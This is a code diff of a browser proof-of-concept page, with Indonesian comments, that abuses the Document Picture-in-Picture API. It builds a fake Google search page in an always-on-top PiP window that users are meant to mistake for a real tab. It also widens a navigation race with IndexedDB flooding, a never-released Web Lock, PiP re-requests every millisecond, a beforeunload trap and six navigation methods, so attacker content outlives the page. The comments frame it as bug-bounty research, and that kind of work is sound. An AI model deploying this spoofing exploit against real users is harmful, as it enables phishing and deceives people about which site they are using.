-.logo span:nth-child(4){color:#4285F4}
-.logo span:nth-child(5){color:#34A853}
-.logo span:nth-child(6){color:#EA4335}
-.search-box{display:flex;align-items:center;width:580px;max-width:90%;border:1px solid #dfe1e5;border-radius:24px;padding:6px 14px;
-            box-shadow:0 1px 6px rgba(32,33,36,.1);transition:box-shadow .2s}
-.search-box:hover,.search-box:focus-within{box-shadow:0 1px 6px rgba(32,33,36,.28)}
-.search-box input{flex:1;border:none;outline:none;font-size:16px;padding:8px;color:#202124;background:transparent}
-.search-box svg{width:20px;height:20px;fill:#9aa0a6;flex-shrink:0}
-.btns{margin-top:24px;display:flex;gap:10px}
-.btns button{padding:9px 16px;background:#f8f9fa;border:1px solid #f8f9fa;border-radius:4px;cursor:pointer;font-size:14px;color:#3c4043}
-.btns button:hover{border-color:#dadce0}
-.footer{background:#f2f2f2;border-top:1px solid #dadce0;padding:12px 20px}
-.footer-row{display:flex;justify-content:space-between;font-size:13px;color:#70757a}
-.footer-row a{color:#70757a;text-decoration:none;margin:0 10px;cursor:pointer}
-.alive-indicator{position:fixed;bottom:2px;right:4px;font-size:8px;color:#eee;font-family:monospace;opacity:.3}
-</style></head><body>
-<div class="header">
-    <a>Gmail</a>
-    <a>Images</a>
-    <a style="display:inline-flex;align-items:center;gap:6px;background:#1a73e8;color:#fff;padding:7px 18px;border-radius:4px;font-weight:500">Sign in</a>
-</div>
-<div class="center">
-    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
-    <div class="search-box">
-        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
-        <input type="text" placeholder="Search Google or type a URL" autofocus>
-        <svg viewBox="0 0 24 24"><path d="M12 15c1.66 0 2.99-1.34 2.99-3L15 6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 15 6.7 12H5c0 3.42 2.72 6.23 6 6.72V22h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
-    </div>
-    <div class="btns">
-        <button>Google Search</button>
-        <button>I'm Feeling Lucky</button>
-    </div>
-</div>
-<div class="footer">
-    <div class="footer-row">
-        <span>Advertising</span>
-        <span>
-            <a>About</a><a>Advertising</a><a>Business</a><a>How Search works</a>
-        </span>
-        <span>
-            <a>Privacy</a><a>Terms</a><a>Settings</a>
-        </span>
-    </div>
-</div>
-<div class="alive-indicator" id="ai">.</div>
-<script>let s=0;setInterval(()=>{s++;document.getElementById('ai').textContent=s+'s'},1000);<\/script>
-</body></html>`);
-    pipWin.document.close();
-
-    // Minimize/blur opener
-    window.blur();
-
-    // Also open real google in new window behind
+    // 4f. IndexedDB flood
     try {
-        const bg = window.open(cfg('cfgUrl'), '_blank',
-            `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0`);
-        if (bg) { /* PiP is always-on-top so it covers this new window */ }
+        const dbReq = indexedDB.open('race', 1);
+        dbReq.onupgradeneeded = () => dbReq.result.createObjectStore('s');
+        dbReq.onsuccess = () => {
+            const db = dbReq.result;
+            window.addEventListener('pagehide', () => {
+                try {
+                    const tx = db.transaction('s', 'readwrite');
+                    const st = tx.objectStore('s');
+                    for (let i = 0; i < 50000; i++) st.put(new ArrayBuffer(1000), 'k' + i);
+                } catch(e) {}
+            }, { capture: true });
+        };
     } catch(e) {}
 
-    log('s', '═══════════════════════════════════════');
-    log('s', '🎭 Fullscreen PiP deployed!');
-    log('s', '   PiP terlihat seperti halaman Google biasa');
-    log('s', '   Always-on-top — tetap di depan semua window');
-    log('s', '   User berinteraksi tanpa sadar ini PiP window');
-    log('s', '   Opener hidup di background → PiP PERSIST');
-    log('s', '═══════════════════════════════════════');
-}
+    // 4g. Web Locks — hold lock that may delay teardown
+    try {
+        navigator.locks.request('pip-persist', { mode: 'exclusive' }, () => {
+            return new Promise(() => {}); // Never resolve
+        });
+    } catch(e) {}
 
-// ═══════════════════════════════════════════════════
-//
-//      STRATEGY D: Race Condition + beforeunload Hold
-//
-//  Teknik asli user + improvement:
-//  1. Worker flood (heavy computation, bukan cuma "1")
-//  2. beforeunload dialog — HOLDS navigation, PiP tetap hidup
-//  3. User melihat PiP selagi dialog "Leave page?" aktif
-//  4. Jika user klik "Stay" → PiP persist permanent!
-//     Jika user klik "Leave" → PiP hilang (expected)
-//
-//  Ini memperlebar "demo window" untuk PoC reporting.
-//  Untuk bug bounty, ini cukup sebagai bukti bahwa PiP
-//  menampilkan konten attacker selama dialog aktif.
-//
-// ═══════════════════════════════════════════════════
-async function strategyD() {
-    log('i', '⚡ Strategy D: Race + beforeunload hold');
+    // 4h. requestWindow re-flood during race
+    setInterval(async () => {
+        try {
+            const p = await documentPictureInPicture.requestWindow({ width: pipW, height: pipH });
+            p.document.write(pipContent());
+            p.document.close();
+            log('s', '🎯 PiP RE-REQUESTED DURING RACE!');
+        } catch(e) {}
+    }, 1);
 
-    if (!await createPiP()) return;
-
-    // Spawn heavy workers
-    floodWorkers(cfgN('cfgWorkers'));
-
-    // Register beforeunload — this PAUSES the navigation!
+    // 4i. beforeunload — user can click "Stay" for instant persist
     window.addEventListener('beforeunload', (e) => {
-        // While this dialog is showing:
-        // - Document is ALIVE
-        // - PiP is ALIVE
-        // - User can see PiP with attacker content
-        // - If user clicks "Stay" → PiP persists!
         e.preventDefault();
         e.returnValue = '';
         return '';
     });
 
-    // Also register pagehide with heavy computation
-    window.addEventListener('pagehide', () => {
-        // Try to extend race window after user clicks "Leave"
-        const start = performance.now();
-        while (performance.now() - start < 3000) {
-            Math.pow(Math.random(), Math.random());
-        }
-    });
+    log('i', '🛡️ All race extensions registered');
+    log('w', `⏳ Navigating in ${navDelay}ms via method ${navMethod}...`);
+    log('w', '───────────────────────────────────────');
+    log('w', 'SAAT NAVIGATE:');
+    log('w', '  1. beforeunload dialog → klik STAY = auto persist');
+    log('w', '  2. Klik LEAVE → debugger pause (jika DevTools open)');
+    log('w', '  3. Saat pause: CEK PIP ORIGIN BAR → screenshot!');
+    log('w', '  4. alert/confirm/print mungkin muncul (Arc/Atlas)');
+    log('w', '  5. Blocking handler delay teardown ~20 detik');
+    log('w', '───────────────────────────────────────');
 
-    // Also try re-requesting PiP during navigation
-    setInterval(async () => {
-        try {
-            const rePip = await documentPictureInPicture.requestWindow({ width: cfgN('cfgW'), height: cfgN('cfgH') });
-            rePip.document.write(buildPipContent('Google Account'));
-            rePip.document.close();
-            log('s', '🎯 PiP re-requested during race!');
-        } catch(e) {}
-    }, 5);
-
-    const delay = cfgN('cfgDelay');
-    log('i', `Navigating to ${cfg('cfgUrl')} in ${delay}ms...`);
-    log('w', '⚠️ "Leave page?" dialog will appear — PiP stays while dialog shown');
-    log('i', 'Klik "Stay" untuk keep PiP persistent!');
-
+    // ── 5. NAVIGATE using selected method ──
     setTimeout(() => {
-        log('w', `🔥 NAVIGATING NOW — watch for beforeunload dialog!`);
-        window.location.href = cfg('cfgUrl');
-    }, delay);
+        log('w', '🔥 NAVIGATING NOW via method ' + navMethod);
+        navigate(target);
+    }, navDelay);
 }
 
-// ═══════════════════════════════════════════════════
-// LAUNCH
-// ═══════════════════════════════════════════════════
-async function launch() {
-    const btn = document.getElementById('goBtn');
-    btn.disabled = true;
-    btn.textContent = '⏳ Running...';
+// ═══════════════════════════════════════
+// 6 DIFFERENT NAVIGATION METHODS
+// Each goes through different Chromium code paths
+// Some might have longer race windows in Arc/Atlas
+// ═══════════════════════════════════════
+function navigate(url) {
+    switch (navMethod) {
+        case 1:
+            // Standard — most common
+            window.location.href = url;
+            break;
 
-    log('i', '═══════════════════════════');
-    log('i', `Launching Strategy ${'ABCD'[strat-1]}`);
+        case 2:
+            // replace — no history entry, different internal path
+            window.location.replace(url);
+            break;
 
-    switch(strat) {
-        case 1: await strategyA(); break;
-        case 2: await strategyB(); break;
-        case 3: await strategyC(); break;
-        case 4: await strategyD(); break;
+        case 3:
+            // assign — explicit method call
+            window.location.assign(url);
+            break;
+
+        case 4:
+            // Meta refresh — goes through HTML parser path
+            const meta = document.createElement('meta');
+            meta.httpEquiv = 'refresh';
+            meta.content = '0;url=' + url;
+            document.head.appendChild(meta);
+            break;
+
+        case 5:
+            // Anchor click — user-initiated navigation simulation
+            const a = document.createElement('a');
+            a.href = url;
+            a.style.cssText = 'position:fixed;top:0;left:0;opacity:0;';
+            document.body.appendChild(a);
+            a.click();
+            break;
+
+        case 6:
+            // Form POST — different navigation type entirely
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = url;
+            form.style.cssText = 'position:fixed;top:0;left:0;opacity:0;';
+            document.body.appendChild(form);
+            form.submit();
+            break;
     }
-
-    btn.disabled = false;
-    btn.textContent = '▶ Launch PoC';
 }
 </script>
 </body>
